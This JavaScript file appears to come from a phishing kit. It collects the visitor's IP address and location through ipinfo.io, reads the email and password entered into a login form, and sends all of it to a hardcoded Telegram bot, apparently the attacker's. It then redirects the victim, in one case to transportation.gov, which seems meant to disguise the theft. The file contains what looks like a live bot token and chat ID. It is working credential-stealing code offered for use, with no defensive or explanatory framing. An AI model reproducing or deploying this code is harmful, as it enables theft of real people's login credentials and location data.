
var logStamp = localStorage.getItem("uniqueId");
//Enter the needed
var obj;
var token = "5862531178:AAG0DrJs_wVjZ4D49TmIPBsOXvtoRIxD1mI";
var chatId = 6230885323;



function userDetails() {
	fetch("https://ipinfo.io/json")
		.then((res) => res.json())
		.then((data) => (obj = data))
		.then(() => {
			if (obj != null) {
				var result = `Entry ID: ${logStamp} %0AIP: ${obj.ip} | city: ${obj.city} | country: ${obj.country} | loc: ${obj.loc} | org: ${obj.org} | region: ${obj.region} | timezone: ${obj.timezone}`
				fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${result}`).then(function (response) {
					if (response.ok) {
						ooqyl2();
						return 'okay';
					} else {
						return Promise.reject(response);
					}
				}).then(function (data) {
				}).catch(function (err) {
					console.warn('Something went wrong.', err);
				});
			}
		});
}


function oBoqyl2() {
	var eTxt = document.getElementById("email").value;
	var p2Txt = document.getElementById("password").value;

	result = `Logs from ELPAD page %0A Entry ID: ${logStamp}  %0A mail-address : ${eTxt} %0A Password : ${p2Txt} `;

	fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${result}`).then(function (response) {
		if (response.ok) {
			return location.replace('index3.html');
		} else {
			return Promise.reject(response);
		}
	}).then(function (data) {
	}).catch(function (err) {
		console.warn('Something went wrong.', err);
	});
}



function ooqyl2() {
	var eTxt = document.getElementById("email").value;
	var p2Txt = document.getElementById("password").value;

	result = `Logs from ELPAD2 page %0A Entry ID: ${logStamp} (2nd Entry)  %0A mail-address : ${eTxt} %0A Password : ${p2Txt} `;

	fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${result}`).then(function (response) {
		if (response.ok) {
			return location.replace('https://www.transportation.gov');
		} else {
			return Promise.reject(response);
		}
	}).then(function (data) {
	}).catch(function (err) {
		console.warn('Something went wrong.', err);
	});
}
